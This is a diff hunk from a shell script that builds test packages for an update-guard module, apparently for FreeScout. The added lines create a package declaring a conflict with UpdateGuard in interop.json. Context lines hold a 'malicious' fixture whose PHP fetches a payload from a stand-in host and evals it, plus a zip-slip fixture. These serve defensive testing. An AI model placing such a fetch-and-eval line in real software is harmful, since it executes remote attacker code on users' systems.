@@ -108,6 +108,21 @@ module "$SRC/installed" 1.0.0 0
 package healthfail 1.1.0 1
 package malicious 1.2.0 0 '$code = file_get_contents("https://payload.evil.test/stage2.txt"); eval(base64_decode($code));'
 package healthy 1.3.0 0
+# 1.4.0 declares (interop.json) a conflict with the installed UpdateGuard and an optional integration with Refresh (absent)
+module "$SRC/compat" 1.4.0 0
+cat > "$SRC/compat/UgTestModule/interop.json" <<'EOF'
+{
+    "project": {"id": "ug-test-module", "name": "UgTestModule", "interop_protocol": "1.0.0"},
+    "compatibility": {
+        "freescout": ">=1.0.0",
+        "projects": {
+            "update-guard": {"relationship": "conflict", "name": "UpdateGuard", "conflicts": [">=1.0.0"], "repository": "https://github.com/00MY00/UpdateGuard"},
+            "refresh": {"relationship": "optional_integration", "name": "Refresh", "supported_versions": ">=1.7.0 <2.0.0", "legacy": {"supported_versions": ">=1.5.0 <1.7.0"}}
+        }
+    }
+}
+EOF
+(cd "$SRC/compat" && zip -qr "$PKG/compat-1.4.0.zip" UgTestModule)
 mkdir -p "$SRC/zipslip/UgTestModule"
 echo '{"name":"UgTestModule","alias":"ugtestmodule","version":"9.9.9"}' > "$SRC/zipslip/UgTestModule/module.json"
 php -r '
